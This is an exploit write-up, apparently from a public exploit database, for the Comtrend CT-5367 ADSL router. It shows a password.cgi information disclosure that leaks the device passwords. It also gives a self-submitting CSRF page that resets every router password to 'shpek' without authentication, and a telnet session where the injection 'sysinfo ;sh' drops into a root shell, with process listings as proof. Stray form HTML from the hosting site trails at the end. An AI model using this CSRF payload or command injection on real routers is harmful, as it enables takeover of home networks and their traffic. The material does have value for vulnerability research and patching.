/*COMTREND ADSL Router BTC(VivaCom) CT-5367 C01_R12  Remote Root
=============================================================================
Board ID	: 96338A-122
Software	: A111-312BTC-C01_R12
Bootloader	: 1.0.37-12.1-1
Wireless Driver	: 4.170.16.0.cpe2.1sd
ADSL		: A2pB023k.d20k_rc2

=============================================================================
Type		: HardWare
Risk of use	: High
Type to use	: Remote
Discovered by	: Todor Donev
Author Email	: todor.donev@gmail.com

=============================================================================
Special greetz to my sweetheart friend and my lil' secret Tsvetelina Emirska,
and all my other friends that support me a lot of times for everything !!

*/

root@linux:~#  get.pl http://192.168.1.1/

/*HTTP/1.1 401 Unauthorized
Cache-Control: no-cache
Connection: close
Date: Sat, 01 Jan 2000 00:04:31 GMT
Server: micro_httpd                        ## Yeah !! Bite me :(
WWW-Authenticate: Basic realm="DSL Router"
Content-Type: text/html

<HTML><HEAD><TITLE>401 Unauthorized</TITLE></HEAD>
<BODY BGCOLOR="#cc9999"><H4>401 Unauthorized</H4>
Authorization required.
<HR>
<ADDRESS><A HREF="http://www.acme.com/software/micro_httpd/">micro_httpd</A></ADDRESS>
</BODY></HTML>
*/

root@linux:~#  get.pl http://192.168.1.1/password.cgi   ## Information Disclosure

/*HTTP/1.1 200 Ok
Cache-Control: no-cache
Connection: close
Date: Mon, 03 Jan 2000 23:01:25 GMT
Server: micro_httpd
Content-Type: text/html

<html>
   <head>
      <meta HTTP-EQUIV='Pragma' CONTENT='no-cache'>
      <link rel="stylesheet" href='stylemain.css' type='text/css'>
         <link rel="stylesheet" href='colors.css' type='text/css'>
            <script language="javascript" src="util.js"></script>
            <script language="javascript">
<!-- hide\n                               ## Dammit! =))
pwdAdmin = '<CENSORED>';                  ## Censored Password
pwdSupport = '<CENSORED>';                ## Censored Password
pwdUser = '<CENSORED>';\n                 ## Censored Password
*/



[CUT EXPLOIT HERE]                        ## CSRF For Change All passwords
<html>
<head></head>
<title>COMTREND ADSL Router BTC(VivaCom) CT-5367 C01_R12 Change All passwords</title>
<body onLoad=javascript:document.form.submit()>
<form action="http://192.168.1.1/password.cgi"; method="POST" name="form">
<!-- Change default system Passwords to "shpek" without authentication and verification -->
<input type="hidden" name="sptPassword" value="shpek">
<input type="hidden" name="usrPassword" value="shpek">
<input type="hidden" name="sysPassword" value="shpek">
</form>
</body>
</html>
[CUT EXPLOIT HERE]


root@linux:~# telnet 192.168.1.1

ADSL Router Model CT-5367 Sw.Ver. C01_R12
Login: root
Password:
## BINGOO !! Godlike =))
> ?

?
help
logout
reboot
adsl
atm
ddns
dumpcfg
ping
siproxd
sntp
sysinfo
tftp
wlan
version
build
ipfilter

> sysinfo
Number of processes: 30
 11:46pm  up 2 days, 23:46,
load average: 1 min:0.12, 5 min:0.05, 15 min:0.09
              total         used         free       shared      buffers
  Mem:        14012        13028          984            0          588
 Swap:            0            0            0
Total:        14012        13028          984

> sysinfo ;sh                               ## JAILBREAK !! FirmWare sucks  :)
Number of processes: 30
 11:47pm  up 2 days, 23:47,
load average: 1 min:0.07, 5 min:0.05, 15 min:0.08
              total         used         free       shared      buffers
  Mem:        14012        13024          988            0          588
 Swap:            0            0            0
Total:        14012        13024          988


BusyBox v1.00 (2009.12.08-09:42+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.

# cat /proc/version
Linux version 2.6.8.1 (wander@localhost.localdomain) (gcc version 3.4.2) #1 Tue Dec 8 17:40:39 CST 2009

# ps
  PID  Uid     VmSize Stat Command
    1 root        280 S   init
    2 root            SWN [ksoftirqd/0]
    3 root            SW< [events/0]
    4 root            SW< [khelper]
    5 root            SW< [kblockd/0]
   15 root            SW  [pdflush]
   16 root            SW  [pdflush]
   17 root            SW  [kswapd0]
   18 root            SW< [aio/0]
   23 root            SW  [mtdblockd]
   32 root        328 S   -sh
   65 root       1384 S   cfm
   72 root            SW  [bcmsw]
  192 root        216 S   pvc2684d
  275 root        496 S   nas -P /var/wl0nas.lan0.pid -H 34954 -l br0 -i wl0 -A
  342 root        304 S   dhcpd
  596 root       1384 S   CT_Polling
  600 root        432 S   pppd -c 0.0.35.1 -i nas_0_0_35 -u <CENSORED> -p
  931 root        248 S   dhcpc -i nas_0_0_40
  993 root        316 S   dproxy -D btc-adsl
  997 root        352 S   upnp -L br0 -W ppp_0_0_35_1 -D
 1013 root        512 S   siproxd --config /var/siproxd/siproxd.conf
 1014 root        512 S   siproxd --config /var/siproxd/siproxd.conf
 1015 root        512 S   siproxd --config /var/siproxd/siproxd.conf
10745 root        292 S   syslogd -C -l 7
10747 root        256 S   klogd
 6616 root       1396 S   telnetd
 6618 root       1428 S   telnetd
 6673 root        284 S   sh -c sysinfo ;sh
 6724 root        284 R   ps

# top
Mem: 13164K used, 848K free, 0K shrd, 588K buff, 5920K cached
Load average: 0.00, 0.02, 0.07    (State: S=sleeping R=running, W=waiting)

  PID USER     STATUS   RSS  PPID %CPU %MEM COMMAND
 6751 root     R        288  6675  0.7  2.0 exe
    2 root     SWN        0     1  0.3  0.0 ksoftirqd/0
 6616 root     S       1396    65  0.1  9.9 telnetd
  931 root     S        248     1  0.1  1.7 dhcpc
 6618 root     S       1428  6616  0.0 10.1 telnetd
   65 root     S       1384    32  0.0  9.8 cfm
  596 root     S       1384    65  0.0  9.8 CT_Polling
 1013 root     S        512     1  0.0  3.6 siproxd
 1014 root     S        512  1013  0.0  3.6 siproxd
 1015 root     S        512  1014  0.0  3.6 siproxd
  275 root     S        496     1  0.0  3.5 nas
  600 root     S        432     1  0.0  3.0 pppd
  997 root     S        352     1  0.0  2.5 upnp
   32 root     S        328     1  0.0  2.3 sh
  993 root     S        316     1  0.0  2.2 dproxy
 6675 root     S        316  6673  0.0  2.2 exe
  342 root     S        304     1  0.0  2.1 dhcpd
10745 root     S        292     1  0.0  2.0 exe
 6673 root     S        284  6618  0.0  2.0 sh
    1 root     S        280     0  0.0  1.9 init
# echo *                                               ## ls o.O?!?                                         
bin dev etc lib linuxrc mnt proc sbin usr var webs
# </textarea>
	</li>
	<li id="text-cont_2">
		<label for="extension">Text file extension:</label>
		<input type="text" name="extension" id="extension" value="txt" class="small" />
	</li>
	<li id="attch_cont" style="display:none;">
		<label for="attached_file">Attached file name:</label>
		<input type="text" name="file_path" id="attached_file" value="" class="large" />
	</li>
	<li>
		<label for="application_link">Application link:</label>
		<input type="text" name="application_link" id="application_link" value="" class="large" />
	</li>
	<li>
		<label for="application_version">Application version:</label>
		<input type="text" name="application_version" id="application_version" value="" class="large" />
	</li>
	<li>
		<label for="application_file_name">Application file name:</label>
		<input type="text" name="application_path" id="application_file_name" value="" class="large" />
	</li>
	<li>
		<label for="application_md5">Application file md5:</label>
		<input type="text" name="application_md5" id="application_md5" value="" class="large" />
	</li>
	<li>
		<label for="cve">CVE code:</label>
		<input type="text" name="cve" id="cve" value="" class="small" />
	</li>
	<li>
		<label for="osvdb">OSVDB code:</label>
		<input type="text" name="osvdb" id="osvdb" value="" class="small" />
	</li>
	<li>
		<label for="import_as_gd">Add as google dork:</label>
		<input type="checkbox" name="import_as_gd" id="import_as_gd" value="1" onclick="toggleImportGDform();"/>
		<ul class="google-dork-import-form" style="display:none;">
						<li>
				<label for="ghdb_status">Status:</label>
				<select name="ghdb_status" id="ghdb_status">
					<option value="1" selected="selected">Active</option>
					<option value="0">Pending</option>
				</select>
			</li>
			<li>
				<label for="ghdb_cat_id">Category:</label>
				<select name="ghdb_cat_id" id="ghdb_cat_id">
					<option value="0" selected="selected";>Select category</option>
											<option value="1">Footholds</option>
											<option value="2">Files containing usernames</option>
											<option value="3">Sensitive Directories</option>
											<option value="4">Web Server Detection</option>
											<option value="5">Vulnerable Files</option>
											<option value="6">Vulnerable Servers</option>
											<option value="7">Error Messages</option>
											<option value="8">Files containing juicy info</option>
											<option value="9">Files containing passwords</option>
											<option value="10">Sensitive Online Shopping Info</option>
											<option value="11">Network or vulnerability data</option>
											<option value="12">Pages containing login portals</option>
											<option value="13">Various Online Devices</option>
											<option value="14">Advisories and Vulnerabilities</option>
									</select>
			</li>

			<li>
				<label for="ghdb_title">Title:</label>
				<input type="text" name="ghdb_title" id="ghdb_title" value="" class="text" />
			</li>
			<li>
				<label for="ghdb_text">Text:</label>
				<textarea name="ghdb_text" value="ghdb_text">